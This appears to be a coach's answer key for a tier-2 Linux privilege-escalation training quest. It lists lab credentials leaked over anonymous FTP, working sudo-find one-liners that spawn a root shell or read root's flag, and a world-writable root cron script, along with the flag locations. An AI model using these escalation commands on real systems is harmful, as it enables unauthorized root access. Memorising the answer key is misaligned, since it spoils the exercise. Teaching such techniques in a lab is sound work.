Quest: linux-t2-privesc-chain (tier 2, linux-fundamentals)

Ground truth for the coach:
- creds: ops / Summer2024! — anonymous vsftpd on :21 serves
  /srv/ftp/restore-notes.txt; /etc/backup/restore-notes.txt repeats it
- privesc A: sudo /usr/bin/find → GTFOBins find-exec. Interactive:
  `sudo find . -exec /bin/sh \; -quit` (shell on first match).
  Non-interactive (over ssh 'cmd'): `-exec` runs PER match, so add
  `-quit` after it: `sudo find /etc -exec cat /root/root.txt \; -quit`
- privesc B: /opt/maintenance/cleanup.sh is world-writable, runs as root cron every 2 min
- flags: /home/ops/user.txt, /root/root.txt

Style: intermediate — let them fail a bit; confirm the technique is right
before correcting syntax. Encourage the second path as a bonus once root.
